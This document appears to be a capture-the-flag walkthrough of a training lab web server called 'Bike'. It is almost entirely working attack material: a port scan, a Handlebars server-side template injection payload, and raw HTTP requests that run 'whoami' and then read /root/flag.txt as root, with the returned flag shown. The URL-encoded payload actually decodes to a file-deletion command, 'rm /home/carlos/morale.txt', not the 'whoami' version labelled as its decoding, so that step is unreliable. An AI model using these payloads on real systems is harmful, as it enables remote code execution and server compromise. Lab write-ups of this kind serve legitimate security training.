```
┌──(kali㉿kali)-[~]
└─$ nmap -sC 10.129.75.240
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-27 12:06 EST
Nmap scan report for 10.129.75.240
Host is up (0.049s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http
|_http-title:  Bike 

Nmap done: 1 IP address (1 host up) scanned in 3.78 seconds
```

 Server Side Template Injection 
 
 {{7*7}}
 
```
0	"Error: Parse error on line 1:"
1	"{{7*7}}"
2	"--^"
3	"Expecting 'ID', 'STRING', 'NUMBER', 'BOOLEAN', 'UNDEFINED', 'NULL', 'DATA', got 'INVALID'"
4	"    at Parser.parseError (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:268:19)"
5	"    at Parser.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/parser.js:337:30)"
6	"    at HandlebarsEnvironment.parse (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/base.js:46:43)"
7	"    at compileInput (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:515:19)"
8	"    at ret (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/compiler.js:524:18)"
9	"    at router.post (/root/Backend/routes/handlers.js:15:18)"
10	"    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)"
11	"    at next (/root/Backend/node_modules/express/lib/router/route.js:137:13)"
12	"    at Route.dispatch (/root/Backend/node_modules/express/lib/router/route.js:112:3)"
13	"    at Layer.handle [as handle_request] (/root/Backend/node_modules/express/lib/router/layer.js:95:5)"
 ```

`https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection`

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

URLencoded:
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```

decode:

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```
 
 email: send decoded text burpsuit.
 
```
0	"ReferenceError: require is not defined"
1	"    at Function.eval (eval at <anonymous> (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23)), <anonymous>:3:1)"
2	"    at Function.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:10:25)"
3	"    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:5:37)"
4	"    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)"
5	"    at execIteration (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:51:19)"
6	"    at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/each.js:61:13)"
7	"    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:31)"
8	"    at prog (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/runtime.js:221:12)"
9	"    at Array.<anonymous> (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/helpers/with.js:22:14)"
10	"    at eval (eval at createFunctionContext (/root/Backend/node_modules/handlebars/dist/cjs/handlebars/compiler/javascript-compiler.js:254:23), <anonymous>:12:34)"
```

testings if process main module works
```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

it does!.

trying to post with whoami command to see user.

```
POST / HTTP/1.1

Host: 10.129.75.240

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 600

Origin: http://10.129.75.240

Connection: close

Referer: http://10.129.75.240/

Upgrade-Insecure-Requests: 1



email={{#with "s" as |string|}}

  {{#with "e"}}

    {{#with split as |conslist|}}

      {{this.pop}}

      {{this.push (lookup string.sub "constructor")}}

      {{this.pop}}

      {{#with string.split as |codelist|}}

        {{this.pop}}

        {{this.push "return global.process.mainModule.constructor._load('child_process').execSync('whoami').toString()"}}

        {{this.pop}}

        {{#each conslist}}

          {{#with (string.sub.apply 0 codelist)}}

            {{this}}

          {{/with}}

        {{/each}}

      {{/with}}

    {{/with}}

  {{/with}}

{{/with}}&action=Submit
```

respond:

```
HTTP/1.1 200 OK

X-Powered-By: Express

Content-Type: text/html; charset=utf-8

Content-Length: 1233

ETag: W/"4d1-Y2dTfLXUh5thexkFfxULykQ7sjw"

Date: Sun, 27 Nov 2022 17:42:21 GMT

Connection: close



<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/home.css">
    <title> Bike </title>
</head>
<header>

</header>

<body>
    <div id=container>
  <img
    src="images/buttons.gif"
    id="avatar">
  <div class="type-wrap">
    <span id="typed" style="white-space:pre;" class="typed"></span>
  </div>
</div>
<div id="contact">
    <h3>We can let you know once we are up and running.</h3>
    <div class="fields">
      <form id="form" method="POST" action="/">
        <input name="email" placeholder="E-mail"></input>
        <button type="submit" class="button-54" name="action" value="Submit">Submit</button>
      </form>
    </div>
    <p class="result">
        We will contact you at:       e

      2

      [object Object]

        function Function() { [native code] }

        2

        [object Object]

            root



    </p>
</div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="js/typed.min.js"></script>
    <script src="js/main.js"></script>
</body>

</html>
```

found flag at root

```
POST / HTTP/1.1

Host: 10.129.75.240

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: application/x-www-form-urlencoded

Content-Length: 612

Origin: http://10.129.75.240

Connection: close

Referer: http://10.129.75.240/

Upgrade-Insecure-Requests: 1



email={{#with "s" as |string|}}

  {{#with "e"}}

    {{#with split as |conslist|}}

      {{this.pop}}

      {{this.push (lookup string.sub "constructor")}}

      {{this.pop}}

      {{#with string.split as |codelist|}}

        {{this.pop}}

        {{this.push "return global.process.mainModule.constructor._load('child_process').execSync('cat /root/flag.txt').toString()"}}

        {{this.pop}}

        {{#each conslist}}

          {{#with (string.sub.apply 0 codelist)}}

            {{this}}

          {{/with}}

        {{/each}}

      {{/with}}

    {{/with}}

  {{/with}}

{{/with}}&action=Submit
```
 
```
HTTP/1.1 200 OK

X-Powered-By: Express

Content-Type: text/html; charset=utf-8

Content-Length: 1261

ETag: W/"4ed-yrnC0N85ji5Sq+e6oH/OGoEZr0Y"

Date: Sun, 27 Nov 2022 17:48:03 GMT

Connection: close



<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="css/home.css">
    <title> Bike </title>
</head>
<header>

</header>

<body>
    <div id=container>
  <img
    src="images/buttons.gif"
    id="avatar">
  <div class="type-wrap">
    <span id="typed" style="white-space:pre;" class="typed"></span>
  </div>
</div>
<div id="contact">
    <h3>We can let you know once we are up and running.</h3>
    <div class="fields">
      <form id="form" method="POST" action="/">
        <input name="email" placeholder="E-mail"></input>
        <button type="submit" class="button-54" name="action" value="Submit">Submit</button>
      </form>
    </div>
    <p class="result">
        We will contact you at:       e

      2

      [object Object]

        function Function() { [native code] }

        2

        [object Object]

            6b258d726d287462d60c103d0142a81c



    </p>
</div>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <script src="js/typed.min.js"></script>
    <script src="js/main.js"></script>
</body>

</html>
```
